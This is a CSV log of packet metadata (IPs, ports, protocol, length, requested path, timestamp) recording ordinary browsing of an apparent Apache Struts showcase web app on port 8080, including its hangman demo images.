,content_type,dest_ip,dest_port,highest_layer,length,query_page,src_ip,timestamp
0,,172.17.0.2,8080,HTTP,766,/j,10.0.2.2,1521394900.952944
1,text/html;charset=ISO-8859-1,10.0.2.2,55952,DATA-TEXT-LINES,459,,172.17.0.2,1521394901.056015
2,,172.17.0.2,8080,HTTP,703,/struts/utils.js,10.0.2.2,1521394901.081545
3,text/javascript,10.0.2.2,55952,DATA-TEXT-LINES,59,,172.17.0.2,1521394901.083876
4,,172.17.0.2,8080,HTTP,765,/,10.0.2.2,1521394903.605212
5,text/html,10.0.2.2,55952,HTTP,211,,172.17.0.2,1521394903.606702
6,,172.17.0.2,8080,HTTP,780,/showcase.action,10.0.2.2,1521394903.610774
7,text/html;charset=ISO-8859-1,10.0.2.2,55952,DATA-TEXT-LINES,459,,172.17.0.2,1521394903.649155
8,,172.17.0.2,8080,HTTP,717,/struts/utils.js,10.0.2.2,1521394903.678907
9,text/javascript,10.0.2.2,55952,DATA-TEXT-LINES,59,,172.17.0.2,1521394903.680853
10,,172.17.0.2,8080,HTTP,854,/actionchaining/actionChain1!input.action,10.0.2.2,1521394906.801015
11,text/html;charset=ISO-8859-1,10.0.2.2,55952,DATA-TEXT-LINES,459,,172.17.0.2,1521394907.455466
12,,172.17.0.2,8080,HTTP,851,/tags/ui/actionTagExample!input.action,10.0.2.2,1521394912.048495
13,text/html;charset=ISO-8859-1,10.0.2.2,55952,DATA-TEXT-LINES,459,,172.17.0.2,1521394912.411073
14,,172.17.0.2,8080,HTTP,762,/struts/xhtml/styles.css,10.0.2.2,1521394912.431239
15,,172.17.0.2,8080,HTTP,739,/struts/utils.js,10.0.2.2,1521394912.432486
16,text/css,10.0.2.2,55952,DATA-TEXT-LINES,59,,172.17.0.2,1521394912.4345
17,text/javascript,10.0.2.2,55959,DATA-TEXT-LINES,59,,172.17.0.2,1521394912.441323
18,,172.17.0.2,8080,HTTP,838,/integration/editGangster,10.0.2.2,1521394916.704589
19,text/html;charset=ISO-8859-1,10.0.2.2,55959,DATA-TEXT-LINES,459,,172.17.0.2,1521394917.598533
20,,172.17.0.2,8080,HTTP,749,/struts/xhtml/styles.css,10.0.2.2,1521394917.615981
21,,172.17.0.2,8080,HTTP,726,/struts/utils.js,10.0.2.2,1521394917.615989
22,text/javascript,10.0.2.2,55952,DATA-TEXT-LINES,59,,172.17.0.2,1521394917.625069
23,text/css,10.0.2.2,55959,DATA-TEXT-LINES,59,,172.17.0.2,1521394917.632467
24,,172.17.0.2,8080,HTTP,843,/hangman/hangmanNonAjax.action,10.0.2.2,1521394922.304678
25,,172.17.0.2,8080,HTTP,778,/hangman/images/hangman.png,10.0.2.2,1521394922.775065
26,image/png,10.0.2.2,55952,PNG,4132,,172.17.0.2,1521394922.789445
27,,172.17.0.2,8080,HTTP,783,/hangman/images/Chalkboard_5.png,10.0.2.2,1521394922.792394
28,image/png,10.0.2.2,55952,PNG,1542,,172.17.0.2,1521394922.798007
29,,172.17.0.2,8080,HTTP,783,/hangman/images/guesses-left.png,10.0.2.2,1521394922.80148
30,image/png,10.0.2.2,55952,PNG,2654,,172.17.0.2,1521394922.806881
31,,172.17.0.2,8080,HTTP,781,/hangman/images/scaffold_5.png,10.0.2.2,1521394922.809691
32,,172.17.0.2,8080,HTTP,776,/hangman/images/guess.png,10.0.2.2,1521394922.814667
33,,172.17.0.2,8080,HTTP,793,/hangman/images/Chalkboard_underscroll.png,10.0.2.2,1521394922.814669
34,,172.17.0.2,8080,HTTP,777,/hangman/images/choose.png,10.0.2.2,1521394922.814672
35,,172.17.0.2,8080,HTTP,783,/hangman/images/Chalkboard_A.png,10.0.2.2,1521394922.815145
36,image/png,10.0.2.2,55968,PNG,1392,,172.17.0.2,1521394922.82085
37,image/png,10.0.2.2,55966,PNG,3182,,172.17.0.2,1521394922.822303
38,,172.17.0.2,8080,HTTP,783,/hangman/images/Chalkboard_B.png,10.0.2.2,1521394922.823073
39,,172.17.0.2,8080,HTTP,783,/hangman/images/Chalkboard_C.png,10.0.2.2,1521394922.824984
40,image/png,10.0.2.2,55970,PNG,3603,,172.17.0.2,1521394922.835772
41,,172.17.0.2,8080,HTTP,783,/hangman/images/Chalkboard_D.png,10.0.2.2,1521394922.838202
42,image/png,10.0.2.2,55972,PNG,1673,,172.17.0.2,1521394922.876248
43,image/png,10.0.2.2,55952,PNG,4549,,172.17.0.2,1521394922.877706
44,,172.17.0.2,8080,HTTP,783,/hangman/images/Chalkboard_I.png,10.0.2.2,1521394922.878182
45,,172.17.0.2,8080,HTTP,783,/hangman/images/Chalkboard_K.png,10.0.2.2,1521394922.880002
46,image/png,10.0.2.2,55952,PNG,1713,,172.17.0.2,1521394922.886321
47,,172.17.0.2,8080,HTTP,783,/hangman/images/Chalkboard_M.png,10.0.2.2,1521394922.888104
48,image/png,10.0.2.2,55968,PNG,1742,,172.17.0.2,1521394922.888792
49,,172.17.0.2,8080,HTTP,783,/hangman/images/Chalkboard_N.png,10.0.2.2,1521394922.890844
50,image/png,10.0.2.2,55968,PNG,1701,,172.17.0.2,1521394922.899336
51,,172.17.0.2,8080,HTTP,783,/hangman/images/Chalkboard_Q.png,10.0.2.2,1521394922.902633
